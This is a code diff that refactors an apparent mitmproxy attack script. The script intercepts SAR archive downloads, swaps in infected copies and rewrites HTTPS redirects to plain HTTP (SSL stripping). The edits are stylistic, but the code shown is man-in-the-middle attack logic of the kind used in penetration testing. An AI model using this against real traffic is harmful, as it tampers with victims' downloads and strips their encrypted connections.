@@ -80,7 +80,7 @@ def parse_options(args=None, req_filename=True):
 
     if not req_filename:
         args.pop(0)
-    elif req_filename and not options.sar_filename:
+    elif not options.sar_filename:
         parser.error("Must provide a file to infect!")
 
     if len(args) < 2 or len(args) % 2 != 0:
@@ -153,7 +153,10 @@ def response(context, flow):
         if "content-disposition" in flow.response.headers:
             content_disposition = flow.response.headers.get("content-disposition").lower()
             if content_disposition.startswith("attachment") and content_disposition.endswith(".sar"):
-                context.log("SAR file attachment found (%s bytes)" % flow.response.headers["content-length"])
+                context.log(
+                    f'SAR file attachment found ({flow.response.headers["content-length"]} bytes)'
+                )
+
                 fil = NamedTemporaryFile(delete=False)
                 fil.write(flow.response.content)
                 fil.close()
@@ -167,7 +170,10 @@ def response(context, flow):
 
                 flow.response.content = content
                 flow.response.headers["content-length"] = str(len(content))
-                context.log("Returning infected SAR file (new size %s bytes)" % flow.response.headers["content-length"])
+                context.log(
+                    f'Returning infected SAR file (new size {flow.response.headers["content-length"]} bytes)'
+                )
+
 
                 unlink(fil.name)
                 context.log("Removed temporally file '%s'" % fil.name)
@@ -180,8 +186,7 @@ def response(context, flow):
         if flow.response.headers.get('Location', '').startswith('https://'):
             location = flow.response.headers['Location']
             from six.moves import urllib
-            hostname = urllib.parse.urlparse(location).hostname
-            if hostname:
+            if hostname := urllib.parse.urlparse(location).hostname:
                 context.secure_hosts.add(hostname)
             flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
 
